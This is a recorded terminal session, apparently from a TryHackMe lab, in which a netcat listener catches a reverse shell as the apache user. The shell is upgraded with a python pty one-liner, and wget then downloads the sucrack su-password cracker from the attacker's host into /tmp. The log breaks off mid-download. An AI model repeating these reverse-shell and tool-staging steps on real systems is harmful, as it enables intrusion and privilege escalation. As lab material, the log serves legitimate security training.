@@ -1,0 +1,886 @@
+Script started on 2025-03-20 02:50:24+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 6719
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1001(apache) gid=1001(apache) groups=1001(apache)
+[K[K[?2004hpython3 -c 'import pty;[pt[K[K[Kpty.spawn("/bin?[K/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kapache@tryhackme:/data/www/default$ [Kapache@tryhackme:/data/www/default$ [K[?2004hapache@tryhackme:/data/www/default$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+[Kapache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l
+[Ktotal 40
+drwx------ 7 root   root   4096 Mar 19 23:49 _MEIOeFYgo
+srwxrwxrwx 1 mysql  mysql     0 Mar 19 23:45 mysql.sock
+-rw------- 1 mysql  mysql     5 Mar 19 23:45 mysql.sock.lock
+drwx------ 3 root   root   4096 Mar 19 23:45 snap-private-tmp
+drwxr-xr-x 3 apache apache 4096 Mar 19 23:49 sucrack
+drwx------ 3 root   root   4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-ModemManager.service-jsAH0e
+drwx------ 3 root   root   4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-switcheroo-control.service-oBfb4f
+drwx------ 3 root   root   4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-logind.service-2P5nXe
+drwx------ 3 root   root   4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-resolved.service-co2Vgj
+drwx------ 3 root   root   4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-timesyncd.service-UdhuKi
+drwx------ 3 root   root   4096 Mar 19 23:45 systemd-private-9de3f281cfe246a4a678df13478b7ade-upower.service-G1XbMf
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ rm sucrack[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm sucrack
+[Krm sucrack
+[Krm: cannot remove 'sucrack': No such file or directory
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l
+[Ktotal 36
+drwx------ 7 root  root  4096 Mar 19 23:49 _MEIOeFYgo
+srwxrwxrwx 1 mysql mysql    0 Mar 19 23:45 mysql.sock
+-rw------- 1 mysql mysql    5 Mar 19 23:45 mysql.sock.lock
+drwx------ 3 root  root  4096 Mar 19 23:45 snap-private-tmp
+drwx------ 3 root  root  4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-ModemManager.service-jsAH0e
+drwx------ 3 root  root  4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-switcheroo-control.service-oBfb4f
+drwx------ 3 root  root  4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-logind.service-2P5nXe
+drwx------ 3 root  root  4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-resolved.service-co2Vgj
+drwx------ 3 root  root  4096 Mar 19 23:44 systemd-private-9de3f281cfe246a4a678df13478b7ade-systemd-timesyncd.service-UdhuKi
+drwx------ 3 root  root  4096 Mar 19 23:45 systemd-private-9de3f281cfe246a4a678df13478b7ade-upower.service-G1XbMf
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ wget -r http://10.8.61.245/sucrack[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget -r http://10.8.61.245/sucrack
+[Kwget -r http://10.8.61.245/sucrack
+[K--2025-03-19 23:52:23--  http://10.8.61.245/sucrack
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 301 Moved Permanently
+Location: /sucrack/ [following]
+--2025-03-19 23:52:23--  http://10.8.61.245/sucrack/
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 1041 (1.0K) [text/html]
+Saving to: ‘10.8.61.245/sucrack’
+
+10.8.61.245/sucrack   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   1.02K  --.-KB/s    in 0.002s  
+
+2025-03-19 23:52:24 (582 KB/s) - ‘10.8.61.245/sucrack’ saved [1041/1041]
+
+Loading robots.txt; please ignore errors.
+--2025-03-19 23:52:24--  http://10.8.61.245/robots.txt
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 404 File not found
+2025-03-19 23:52:24 ERROR 404: File not found.
+
+--2025-03-19 23:52:24--  http://10.8.61.245/sucrack/.git/
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 638 [text/html]
+10.8.61.245/sucrack/.git: Not a directory
+10.8.61.245/sucrack/.git/index.html: Not a directory
+
+Cannot write to ‘10.8.61.245/sucrack/.git/index.html’ (Not a directory).
+--2025-03-19 23:52:25--  http://10.8.61.245/sucrack/aclocal.m4
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 43156 (42K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/aclocal.m4’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  29%[====>               ]  12.38K  46.0KB/s               [K         10.8.61.24  29%[====>               ]  12.38K  46.0KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  29%[====>               ]  12.38K  46.0KB/s                       10.8.61.245  84%[===============>    ]  35.61K  67.1KB/s               10.8.61.245/sucrack 100%[===================>]  42.14K  76.8KB/s    in 0.5s    
+
+2025-03-19 23:52:26 (76.8 KB/s) - ‘10.8.61.245/sucrack/aclocal.m4’ saved [43156/43156]
+
+--2025-03-19 23:52:26--  http://10.8.61.245/sucrack/ChangeLog
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 1407 (1.4K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/ChangeLog’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   1.37K  --.-KB/s    in 0.001s  
+
+2025-03-19 23:52:27 (1.31 MB/s) - ‘10.8.61.245/sucrack/ChangeLog’ saved [1407/1407]
+
+--2025-03-19 23:52:27--  http://10.8.61.245/sucrack/compile
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7333 (7.2K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/compile’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   7.16K  --.-KB/s    in 0.01s   
+
+2025-03-19 23:52:27 (511 KB/s) - ‘10.8.61.245/sucrack/compile’ saved [7333/7333]
+
+--2025-03-19 23:52:27--  http://10.8.61.245/sucrack/config.guess
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 44283 (43K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/config.guess’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  30%[=====>              ]  13.25K  49.8KB/s               [K         10.8.61.24  30%[=====>              ]  13.25K  49.8KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  30%[=====>              ]  13.25K  49.8KB/s                       10.8.61.245  87%[================>   ]  37.91K  70.3KB/s               10.8.61.245/sucrack 100%[===================>]  43.25K  79.4KB/s    in 0.5s    
+
+2025-03-19 23:52:28 (79.4 KB/s) - ‘10.8.61.245/sucrack/config.guess’ saved [44283/44283]
+
+--2025-03-19 23:52:28--  http://10.8.61.245/sucrack/config.h.in
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 3118 (3.0K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/config.h.in’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   3.04K  --.-KB/s    in 0.002s  
+
+2025-03-19 23:52:29 (1.87 MB/s) - ‘10.8.61.245/sucrack/config.h.in’ saved [3118/3118]
+
+--2025-03-19 23:52:29--  http://10.8.61.245/sucrack/config.sub
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 36136 (35K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/config.sub’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  37%[======>             ]  13.25K  48.9KB/s               10.8.61.245/sucrack 100%[===================>]  35.29K   114KB/s    in 0.3s    
+
+2025-03-19 23:52:30 (114 KB/s) - ‘10.8.61.245/sucrack/config.sub’ saved [36136/36136]
+
+--2025-03-19 23:52:30--  http://10.8.61.245/sucrack/configure
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 190165 (186K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/configure’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24   7%[>                   ]  13.25K  50.0KB/s               [K         10.8.61.24   7%[>                   ]  13.25K  50.0KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24   7%[>                   ]  13.25K  50.0KB/s                       10.8.61.245  20%[===>                ]  37.38K  71.9KB/s               [K        10.8.61.245  20%[===>                ]  37.38K  71.9KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24   7%[>                   ]  13.25K  50.0KB/s                       10.8.61.245  20%[===>                ]  37.38K  71.9KB/s                      10.8.61.245/  48%[========>           ]  89.92K   113KB/s               [K       10.8.61.245/  48%[========>           ]  89.92K   113KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24   7%[>                   ]  13.25K  50.0KB/s                       10.8.61.245  20%[===>                ]  37.38K  71.9KB/s                      10.8.61.245/  48%[========>           ]  89.92K   113KB/s                     10.8.61.245/s  76%[==============>     ] 142.80K   135KB/s               10.8.61.245/sucrack 100%[===================>] 185.71K   169KB/s    in 1.1s    
+
+2025-03-19 23:52:31 (169 KB/s) - ‘10.8.61.245/sucrack/configure’ saved [190165/190165]
+
+--2025-03-19 23:52:31--  http://10.8.61.245/sucrack/configure.ac
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2030 (2.0K) [application/pkix-attr-cert]
+Saving to: ‘10.8.61.245/sucrack/configure.ac’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   1.98K  --.-KB/s    in 0s      
+
+[K2025-03-19 23:52:32 (169 MB/s) - ‘10.8.61.245/sucrack/configure.ac’ saved [2030/2030]
+
+--2025-03-19 23:52:32--  http://10.8.61.245/sucrack/COPYING
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 1526 (1.5K) [application/octet-stream]
+[KSaving to: ‘10.8.61.245/sucrack/COPYING’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   1.49K  --.-KB/s    in 0s      
+
+2025-03-19 23:52:33 (123 MB/s) - ‘10.8.61.245/sucrack/COPYING’ saved [1526/1526]
+
+--2025-03-19 23:52:33--  http://10.8.61.245/sucrack/depcomp
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 23567 (23K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/depcomp’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  57%[==========>         ]  13.25K  50.5KB/s               10.8.61.245/sucrack 100%[===================>]  23.01K  75.7KB/s    in 0.3s    
+
+2025-03-19 23:52:34 (75.7 KB/s) - ‘10.8.61.245/sucrack/depcomp’ saved [23567/23567]
+
+--2025-03-19 23:52:34--  http://10.8.61.245/sucrack/doc/
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 254 [text/html]
+Saving to: ‘10.8.61.245/sucrack/doc/index.html’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]     254  --.-KB/s    in 0s      
+
+2025-03-19 23:52:35 (31.7 MB/s) - ‘10.8.61.245/sucrack/doc/index.html’ saved [254/254]
+
+--2025-03-19 23:52:35--  http://10.8.61.245/sucrack/INSTALL
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 9498 (9.3K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/INSTALL’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   9.28K  --.-KB/s    in 0.006s  
+
+2025-03-19 23:52:35 (1.49 MB/s) - ‘10.8.61.245/sucrack/INSTALL’ saved [9498/9498]
+
+--2025-03-19 23:52:35--  http://10.8.61.245/sucrack/install-sh
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 15155 (15K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/install-sh’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  89%[================>   ]  13.25K  50.0KB/s               [K         10.8.61.24  89%[================>   ]  13.25K  50.0KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  89%[================>   ]  13.25K  50.0KB/s               10.8.61.245/sucrack 100%[===================>]  14.80K  55.6KB/s    in 0.3s    
+
+2025-03-19 23:52:36 (55.6 KB/s) - ‘10.8.61.245/sucrack/install-sh’ saved [15155/15155]
+
+--2025-03-19 23:52:36--  http://10.8.61.245/sucrack/Makefile.am
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 65 [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/Makefile.am’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]      65  --.-KB/s    in 0s      
+
+2025-03-19 23:52:36 (9.53 MB/s) - ‘10.8.61.245/sucrack/Makefile.am’ saved [65/65]
+
+--2025-03-19 23:52:36--  http://10.8.61.245/sucrack/Makefile.in
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 27892 (27K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/Makefile.in’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  48%[========>           ]  13.25K  48.5KB/s               10.8.61.245/sucrack 100%[===================>]  27.24K  96.3KB/s    in 0.3s    
+
+2025-03-19 23:52:37 (96.3 KB/s) - ‘10.8.61.245/sucrack/Makefile.in’ saved [27892/27892]
+
+--2025-03-19 23:52:37--  http://10.8.61.245/sucrack/missing
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 6872 (6.7K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/missing’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   6.71K  --.-KB/s    in 0.01s   
+
+2025-03-19 23:52:38 (635 KB/s) - ‘10.8.61.245/sucrack/missing’ saved [6872/6872]
+
+--2025-03-19 23:52:38--  http://10.8.61.245/sucrack/README.md
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 6448 (6.3K) [text/markdown]
+Saving to: ‘10.8.61.245/sucrack/README.md’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   6.30K  --.-KB/s    in 0.006s  
+
+2025-03-19 23:52:38 (1.06 MB/s) - ‘10.8.61.245/sucrack/README.md’ saved [6448/6448]
+
+--2025-03-19 23:52:38--  http://10.8.61.245/sucrack/src/
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 1023 [text/html]
+Saving to: ‘10.8.61.245/sucrack/src/index.html’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]    1023  --.-KB/s    in 0.001s  
+
+2025-03-19 23:52:39 (1.02 MB/s) - ‘10.8.61.245/sucrack/src/index.html’ saved [1023/1023]
+
+--2025-03-19 23:52:39--  http://10.8.61.245/sucrack/VERSION
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 6 [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/VERSION’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]       6  --.-KB/s    in 0s      
+
+2025-03-19 23:52:39 (874 KB/s) - ‘10.8.61.245/sucrack/VERSION’ saved [6/6]
+
+--2025-03-19 23:52:39--  http://10.8.61.245/sucrack/doc/sucrack.1
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2212 (2.2K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/doc/sucrack.1’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.16K  --.-KB/s    in 0.006s  
+
+2025-03-19 23:52:40 (367 KB/s) - ‘10.8.61.245/sucrack/doc/sucrack.1’ saved [2212/2212]
+
+--2025-03-19 23:52:40--  http://10.8.61.245/sucrack/src/dictionary.c
+Connecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 9746 (9.5K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/dictionary.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   9.52K  --.-KB/s    in 0.03s   
+
+2025-03-19 23:52:40 (341 KB/s) - ‘10.8.61.245/sucrack/src/dictionary.c’ saved [9746/9746]
+
+--2025-03-19 23:52:40--  http://10.8.61.245/sucrack/src/dictionary.h
+Reusing existing connection to 10.8.61.245:80.
+HTTP request sent, awaiting response... No data received.
+Retrying.
+
+[K--2025-03-19 23:52:41--  (try: 2)  http://10.8.61.245/sucrack/src/dictionary.h
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 2503 (2.4K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/dictionary.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.44K  --.-KB/s    in 0.001s  
+
+2025-03-19 23:52:42 (2.96 MB/s) - ‘10.8.61.245/sucrack/src/dictionary.h’ saved [2503/2503]
+
+--2025-03-19 23:52:42--  http://10.8.61.245/sucrack/src/Makefile.am
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 330 [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/src/Makefile.am’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]     330  --.-KB/s    in 0s      
+
+2025-03-19 23:52:43 (40.6 MB/s) - ‘10.8.61.245/sucrack/src/Makefile.am’ saved [330/330]
+
+--2025-03-19 23:52:43--  http://10.8.61.245/sucrack/src/Makefile.in
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 34714 (34K) [application/octet-stream]
+Saving to: ‘10.8.61.245/sucrack/src/Makefile.in’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s               [K          10.8.61.2   0%[                    ]       0  --.-KB/s                        10.8.61.24  39%[======>             ]  13.25K  51.0KB/s               10.8.61.245/sucrack 100%[===================>]  33.90K   119KB/s    in 0.3s    
+
+2025-03-19 23:52:43 (119 KB/s) - ‘10.8.61.245/sucrack/src/Makefile.in’ saved [34714/34714]
+
+--2025-03-19 23:52:43--  http://10.8.61.245/sucrack/src/pty.c
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3314 (3.2K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/pty.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   3.24K  --.-KB/s    in 0.001s  
+
+2025-03-19 23:52:44 (2.40 MB/s) - ‘10.8.61.245/sucrack/src/pty.c’ saved [3314/3314]
+
+--2025-03-19 23:52:44--  http://10.8.61.245/sucrack/src/pty.h
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 1896 (1.9K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/pty.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   1.85K  --.-KB/s    in 0.001s  
+
+2025-03-19 23:52:44 (3.31 MB/s) - ‘10.8.61.245/sucrack/src/pty.h’ saved [1896/1896]
+
+--2025-03-19 23:52:44--  http://10.8.61.245/sucrack/src/rewriter.c
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 3256 (3.2K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/rewriter.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   3.18K  --.-KB/s    in 0s      
+
+2025-03-19 23:52:45 (21.9 MB/s) - ‘10.8.61.245/sucrack/src/rewriter.c’ saved [3256/3256]
+
+--2025-03-19 23:52:45--  http://10.8.61.245/sucrack/src/rewriter.h
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 2136 (2.1K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/rewriter.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.09K  --.-KB/s    in 0.001s  
+
+2025-03-19 23:52:46 (1.59 MB/s) - ‘10.8.61.245/sucrack/src/rewriter.h’ saved [2136/2136]
+
+--2025-03-19 23:52:46--  http://10.8.61.245/sucrack/src/rules.c
+Reusing existing connection to 10.8.61.245:80.
+HTTP request sent, awaiting response... No data received.
+Retrying.
+
+[K--2025-03-19 23:52:47--  (try: 2)  http://10.8.61.245/sucrack/src/rules.c
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 3392 (3.3K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/rules.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   3.31K  --.-KB/s    in 0.003s  
+
+2025-03-19 23:52:48 (1.22 MB/s) - ‘10.8.61.245/sucrack/src/rules.c’ saved [3392/3392]
+
+--2025-03-19 23:52:48--  http://10.8.61.245/sucrack/src/rules.h
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 3065 (3.0K) [text/x-chdr]
+Saving to: ‘10.8.61.245/sucrack/src/rules.h’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   2.99K  --.-KB/s    in 0s      
+
+2025-03-19 23:52:48 (236 MB/s) - ‘10.8.61.245/sucrack/src/rules.h’ saved [3065/3065]
+
+--2025-03-19 23:52:48--  http://10.8.61.245/sucrack/src/stat.c
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
+Length: 4852 (4.7K) [text/x-csrc]
+Saving to: ‘10.8.61.245/sucrack/src/stat.c’
+
+          10.8.61.2   0%[                    ]       0  --.-KB/s               10.8.61.245/sucrack 100%[===================>]   4.74K  --.-KB/s    in 0.03s   
+
+2025-03-19 23:52:49 (165 KB/s) - ‘10.8.61.245/sucrack/src/stat.c’ saved [4852/4852]
+
+--2025-03-19 23:52:49--  http://10.8.61.245/sucrack/src/stat.h
+Connecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... [KConnecting to 10.8.61.245:80... connected.
+HTTP request sent, awaiting response... [KHTTP request sent, awaiting response... [KHTTP request sent, awaiting response... 200 OK
